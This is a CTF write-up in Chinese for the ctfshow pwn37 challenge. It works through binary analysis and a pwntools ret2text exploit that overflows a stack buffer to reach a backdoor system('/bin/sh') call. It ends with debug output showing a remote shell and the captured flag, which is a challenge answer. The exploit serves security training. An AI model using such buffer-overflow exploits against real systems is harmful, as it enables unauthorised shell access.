```
tasike@tasike-VM:~/Desktop$ chmod 777 pwn37
```

```
tasike@tasike-VM:~/Desktop$ file pwn37
pwn37: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=15cbc2f629db809830de368c7521bc27535cf1d3, not stripped
```

```
tasike@tasike-VM:~/Desktop$ checksec pwn37
[*] '/home/tasike/Desktop/pwn37'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

堆栈不可执行

ida查看：
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  init(&argc);
  logo();
  puts("Just very easy ret2text&&32bit");
  ctfshow();
  puts("\nExit");
  return 0;
}
```

跟进`ctfshow`

```c
ssize_t ctfshow()
{
  char buf[14]; // [esp+6h] [ebp-12h] BYREF

  return read(0, buf, 0x32u);
}
```

**`buf`与`ebp`距离为0x12**

从左侧`Functions`中可以发现后门函数：`backdoor`

```c
int backdoor()
{
  system("/bin/sh");
  return 0;
}
```

因此，利用`ctfshow`函数里的`read`函数，溢出`buf`，覆写返回地址为`backdoor`的地址。



==下面演示：==

编写`attack37.py`

```python
from pwn import *
context(os = 'Linux', arch = 'i386', log_level = 'debug')
r = remote('pwn.challenge.ctf.show', 28246)
payload = cyclic(0x12 + 0x4) + p32(0x08048521)
r.sendline(payload)
r.interactive()
```

运行攻击脚本：
```
tasike@tasike-VM:~/Desktop$ python3 attack37.py
[+] Opening connection to pwn.challenge.ctf.show on port 28246: Done
[DEBUG] Sent 0x1b bytes:
    00000000  61 61 61 61  62 61 61 61  63 61 61 61  64 61 61 61  │aaaa│baaa│caaa│daaa│
    00000010  65 61 61 61  66 61 21 85  04 08 0a                  │eaaa│fa!·│···│
    0000001b
[*] Switching to interactive mode
[DEBUG] Received 0x72 bytes:
    00000000  20 20 20 20  e2 96 84 e2  96 84 e2 96  84 e2 96 84  │    │····│····│····│
    00000010  20 20 20 e2  96 84 e2 96  84 e2 96 84  e2 96 84 e2  │   ·│····│····│····│
    00000020  96 84 e2 96  84 e2 96 84  e2 96 84 20  20 e2 96 84  │····│····│··· │ ···│
    00000030  e2 96 84 e2  96 84 e2 96  84 e2 96 84  e2 96 84 e2  │····│····│····│····│
    00000040  96 84 e2 96  84 20 20 20  20 20 20 20  20 20 20 20  │····│·   │    │    │
    00000050  20 e2 96 84  e2 96 84 20  20 20 20 20  20 20 20 20  │ ···│··· │    │    │
    00000060  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    00000070  20 20                                               │  │
    00000072
    ▄▄▄▄   ▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄            ▄▄                           [DEBUG] Received 0x4ea bytes:
    00000000  0a 20 20 e2  96 88 e2 96  88 e2 96 80  e2 96 80 e2  │·  ·│····│····│····│
    00000010  96 80 e2 96  80 e2 96 88  20 20 e2 96  80 e2 96 80  │····│····│  ··│····│
    00000020  e2 96 80 e2  96 88 e2 96  88 e2 96 80  e2 96 80 e2  │····│····│····│····│
    00000030  96 80 20 20  e2 96 88 e2  96 88 e2 96  80 e2 96 80  │··  │····│····│····│
    00000040  e2 96 80 e2  96 80 e2 96  80 e2 96 80  20 20 20 20  │····│····│····│    │
    00000050  20 20 20 20  20 20 20 20  e2 96 88 e2  96 88 20 20  │    │    │····│··  │
    00000060  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    00000070  20 20 20 20  20 20 20 20  20 0a 20 e2  96 88 e2 96  │    │    │ · ·│····│
    00000080  88 e2 96 80  20 20 20 20  20 20 20 20  20 20 e2 96  │····│    │    │  ··│
    00000090  88 e2 96 88  20 20 20 20  20 e2 96 88  e2 96 88 20  │····│    │ ···│··· │
    000000a0  20 20 20 20  20 20 20 e2  96 84 e2 96  84 e2 96 88  │    │   ·│····│····│
    000000b0  e2 96 88 e2  96 88 e2 96  88 e2 96 88  e2 96 84 20  │····│····│····│··· │
    000000c0  20 e2 96 88  e2 96 88 e2  96 84 e2 96  88 e2 96 88  │ ···│····│····│····│
    000000d0  e2 96 88 e2  96 88 e2 96  84 20 20 20  e2 96 84 e2  │····│····│·   │····│
    000000e0  96 88 e2 96  88 e2 96 88  e2 96 88 e2  96 84 20 20  │····│····│····│··  │
    000000f0  e2 96 88 e2  96 88 20 20  20 20 20 20  e2 96 88 e2  │····│··  │    │····│
    00000100  96 88 0a 20  e2 96 88 e2  96 88 20 20  20 20 20 20  │··· │····│··  │    │
    00000110  20 20 20 20  20 e2 96 88  e2 96 88 20  20 20 20 20  │    │ ···│··· │    │
    00000120  e2 96 88 e2  96 88 e2 96  88 e2 96 88  e2 96 88 e2  │····│····│····│····│
    00000130  96 88 e2 96  88 20 20 20  e2 96 88 e2  96 88 e2 96  │····│·   │····│····│
    00000140  84 e2 96 84  e2 96 84 e2  96 84 20 e2  96 80 20 20  │····│····│·· ·│··  │
    00000150  e2 96 88 e2  96 88 e2 96  80 20 20 20  e2 96 88 e2  │····│····│·   │····│
    00000160  96 88 20 20  e2 96 88 e2  96 88 e2 96  80 20 20 e2  │··  │····│····│·  ·│
    00000170  96 80 e2 96  88 e2 96 88  20 e2 96 80  e2 96 88 20  │····│····│ ···│··· │
    00000180  20 e2 96 88  e2 96 88 20  20 e2 96 88  e2 96 80 0a  │ ···│··· │ ···│····│
    00000190  20 e2 96 88  e2 96 88 e2  96 84 20 20  20 20 20 20  │ ···│····│··  │    │
    000001a0  20 20 20 20  e2 96 88 e2  96 88 20 20  20 20 20 e2  │    │····│··  │   ·│
    000001b0  96 88 e2 96  88 20 20 20  20 20 20 20  20 20 e2 96  │····│·   │    │  ··│
    000001c0  80 e2 96 80  e2 96 80 e2  96 80 e2 96  88 e2 96 88  │····│····│····│····│
    000001d0  e2 96 84 20  20 e2 96 88  e2 96 88 20  20 20 20 e2  │··· │ ···│··· │   ·│
    000001e0  96 88 e2 96  88 20 20 e2  96 88 e2 96  88 20 20 20  │····│·  ·│····│·   │
    000001f0  20 e2 96 88  e2 96 88 20  20 e2 96 88  e2 96 88 e2  │ ···│··· │ ···│····│
    00000200  96 84 e2 96  88 e2 96 88  e2 96 84 e2  96 88 e2 96  │····│····│····│····│
    00000210  88 20 0a 20  20 e2 96 88  e2 96 88 e2  96 84 e2 96  │· · │ ···│····│····│
    00000220  84 e2 96 84  e2 96 84 e2  96 88 20 20  20 20 20 e2  │····│····│··  │   ·│
    00000230  96 88 e2 96  88 20 20 20  20 20 e2 96  88 e2 96 88  │····│·   │  ··│····│
    00000240  20 20 20 20  20 20 20 20  e2 96 88 e2  96 84 e2 96  │    │    │····│····│
    00000250  84 e2 96 84  e2 96 84 e2  96 84 e2 96  88 e2 96 88  │····│····│····│····│
    00000260  20 20 e2 96  88 e2 96 88  20 20 20 20  e2 96 88 e2  │  ··│····│    │····│
    00000270  96 88 20 20  e2 96 80 e2  96 88 e2 96  88 e2 96 84  │··  │····│····│····│
    00000280  e2 96 84 e2  96 88 e2 96  88 e2 96 80  20 20 e2 96  │····│····│····│  ··│
    00000290  80 e2 96 88  e2 96 88 20  20 e2 96 88  e2 96 88 e2  │····│··· │ ···│····│
    000002a0  96 80 20 0a  20 20 20 20  e2 96 80 e2  96 80 e2 96  │·· ·│    │····│····│
    000002b0  80 e2 96 80  20 20 20 20  20 20 e2 96  80 e2 96 80  │····│    │  ··│····│
    000002c0  20 20 20 20  20 e2 96 80  e2 96 80 20  20 20 20 20  │    │ ···│··· │    │
    000002d0  20 20 20 20  e2 96 80 e2  96 80 e2 96  80 e2 96 80  │    │····│····│····│
    000002e0  e2 96 80 e2  96 80 20 20  20 e2 96 80  e2 96 80 20  │····│··  │ ···│··· │
    000002f0  20 20 20 e2  96 80 e2 96  80 20 20 20  20 e2 96 80  │   ·│····│·   │ ···│
    00000300  e2 96 80 e2  96 80 e2 96  80 20 20 20  20 20 e2 96  │····│····│·   │  ··│
    00000310  80 e2 96 80  20 20 e2 96  80 e2 96 80  20 20 0a 20  │····│  ··│····│  · │
    00000320  20 20 20 2a  20 2a 2a 2a  2a 2a 2a 2a  2a 2a 2a 2a  │   *│ ***│****│****│
    00000330  2a 2a 2a 2a  2a 2a 2a 2a  2a 2a 2a 2a  2a 2a 2a 2a  │****│****│****│****│
    00000340  2a 2a 2a 2a  2a 2a 2a 2a  2a 2a 20 20  20 20 20 20  │****│****│**  │    │
    00000350  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    00000360  20 20 20 20  20 0a 20 20  20 20 2a 20  43 6c 61 73  │    │ ·  │  * │Clas│
    00000370  73 69 66 79  3a 20 43 54  46 73 68 6f  77 20 2d 2d  │sify│: CT│Fsho│w --│
    00000380  2d 20 50 57  4e 20 2d 2d  2d 20 e5 85  a5 e9 97 a8  │- PW│N --│- ··│····│
    00000390  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    000003a0  20 20 20 20  20 20 20 20  20 20 20 20  20 20 0a 20  │    │    │    │  · │
    000003b0  20 20 20 2a  20 54 79 70  65 20 20 3a  20 53 74 61  │   *│ Typ│e  :│ Sta│
    000003c0  63 6b 5f 4f  76 65 72 66  6c 6f 77 20  20 20 20 20  │ck_O│verf│low │    │
    000003d0  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    *
    000003f0  20 20 20 20  20 0a 20 20  20 20 2a 20  53 69 74 65  │    │ ·  │  * │Site│
    00000400  20 20 3a 20  68 74 74 70  73 3a 2f 2f  63 74 66 2e  │  : │http│s://│ctf.│
    00000410  73 68 6f 77  2f 20 20 20  20 20 20 20  20 20 20 20  │show│/   │    │    │
    00000420  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    00000430  20 20 20 20  20 20 20 20  20 20 20 20  0a 20 20 20  │    │    │    │·   │
    00000440  20 2a 20 48  69 6e 74 20  20 3a 20 49  74 20 68 61  │ * H│int │ : I│t ha│
    00000450  73 20 73 79  73 74 65 6d  20 61 6e 64  20 27 2f 62  │s sy│stem│ and│ '/b│
    00000460  69 6e 2f 73  68 27 2e 54  68 65 72 65  20 69 73 20  │in/s│h'.T│here│ is │
    00000470  61 20 62 61  63 6b 64 6f  6f 72 20 66  75 6e 63 74  │a ba│ckdo│or f│unct│
    00000480  69 6f 6e 0a  20 20 20 20  2a 20 2a 2a  2a 2a 2a 2a  │ion·│    │* **│****│
    00000490  2a 2a 2a 2a  2a 2a 2a 2a  2a 2a 2a 2a  2a 2a 2a 2a  │****│****│****│****│
    000004a0  2a 2a 2a 2a  2a 2a 2a 2a  2a 2a 2a 2a  2a 2a 2a 20  │****│****│****│*** │
    000004b0  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    000004c0  20 20 20 20  20 20 20 20  20 20 0a 4a  75 73 74 20  │    │    │  ·J│ust │
    000004d0  76 65 72 79  20 65 61 73  79 20 72 65  74 32 74 65  │very│ eas│y re│t2te│
    000004e0  78 74 26 26  33 32 62 69  74 0a                     │xt&&│32bi│t·│
    000004ea

  ██▀▀▀▀█  ▀▀▀██▀▀▀  ██▀▀▀▀▀▀            ██                           
 ██▀          ██     ██        ▄▄█████▄  ██▄████▄   ▄████▄  ██      ██
 ██           ██     ███████   ██▄▄▄▄ ▀  ██▀   ██  ██▀  ▀██ ▀█  ██  █▀
 ██▄          ██     ██         ▀▀▀▀██▄  ██    ██  ██    ██  ██▄██▄██ 
  ██▄▄▄▄█     ██     ██        █▄▄▄▄▄██  ██    ██  ▀██▄▄██▀  ▀██  ██▀ 
    ▀▀▀▀      ▀▀     ▀▀         ▀▀▀▀▀▀   ▀▀    ▀▀    ▀▀▀▀     ▀▀  ▀▀  
    * *************************************                           
    * Classify: CTFshow --- PWN --- 入门                              
    * Type  : Stack_Overflow                                          
    * Site  : https://ctf.show/                                       
    * Hint  : It has system and '/bin/sh'.There is a backdoor function
    * *************************************                           
Just very easy ret2text&&32bit
$
```

```
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x75 bytes:
    b'bin\n'
    b'boot\n'
    b'ctfshow_flag\n'
    b'dev\n'
    b'etc\n'
    b'home\n'
    b'lib\n'
    b'lib32\n'
    b'lib64\n'
    b'media\n'
    b'mnt\n'
    b'opt\n'
    b'proc\n'
    b'pwn\n'
    b'root\n'
    b'run\n'
    b'sbin\n'
    b'srv\n'
    b'start.sh\n'
    b'sys\n'
    b'tmp\n'
    b'usr\n'
    b'var\n'
bin
boot
ctfshow_flag
dev
etc
home
lib
lib32
lib64
media
mnt
opt
proc
pwn
root
run
sbin
srv
start.sh
sys
tmp
usr
var
$ 
```

```
$ cat ctfshow_flag
[DEBUG] Sent 0x11 bytes:
    b'cat ctfshow_flag\n'
[DEBUG] Received 0x2e bytes:
    b'ctfshow{9851d39c-11cd-4cba-8884-9dc9bec8c794}\n'
ctfshow{9851d39c-11cd-4cba-8884-9dc9bec8c794}
[*] Got EOF while reading in interactive
$  
```

